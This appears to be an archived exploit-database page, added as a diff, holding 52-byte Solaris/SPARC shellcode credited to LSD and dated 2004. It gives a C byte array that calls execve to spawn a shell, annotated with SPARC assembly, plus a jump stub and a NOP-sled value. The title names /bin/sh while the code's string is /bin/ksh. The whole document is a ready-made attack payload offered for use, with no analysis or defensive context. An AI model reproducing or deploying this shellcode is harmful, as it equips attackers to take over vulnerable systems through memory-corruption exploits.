@@ -1,0 +1,23 @@
+<html><head><title>solaris/SPARC execve /bin/sh 52 bytes</title></head><pre>//Solaris/Sparc - LSD
+char shellcode[]=
+    &quot;\x20\xbf\xff\xff&quot;     /* bn,a    &lt;shellcode-4&gt;        */
+    &quot;\x20\xbf\xff\xff&quot;     /* bn,a    &lt;shellcode&gt;          */
+    &quot;\x7f\xff\xff\xff&quot;     /* call    &lt;shellcode+4&gt;        */
+    &quot;\x90\x03\xe0\x20&quot;     /* add     %o7,32,%o0           */
+    &quot;\x92\x02\x20\x10&quot;     /* add     %o0,16,%o1           */
+    &quot;\xc0\x22\x20\x08&quot;     /* st      %g0,[%o0+8]          */
+    &quot;\xd0\x22\x20\x10&quot;     /* st      %o0,[%o0+16]         */
+    &quot;\xc0\x22\x20\x14&quot;     /* st      %g0,[%o0+20]         */
+    &quot;\x82\x10\x20\x0b&quot;     /* mov     0xb,%g1              */
+    &quot;\x91\xd0\x20\x08&quot;     /* ta      8                    */
+    &quot;/bin/ksh&quot;
+;
+
+char jump[]=
+    &quot;\x81\xc3\xe0\x08&quot;     /* jmp     %o7+8                */
+    &quot;\x90\x10\x00\x0e&quot;     /* mov     %sp,%o0              */
+;
+
+static char nop[]=&quot;\x80\x1c\x40\x11&quot;;
+
+# milw0rm.com [2004-09-26]</pre></html>
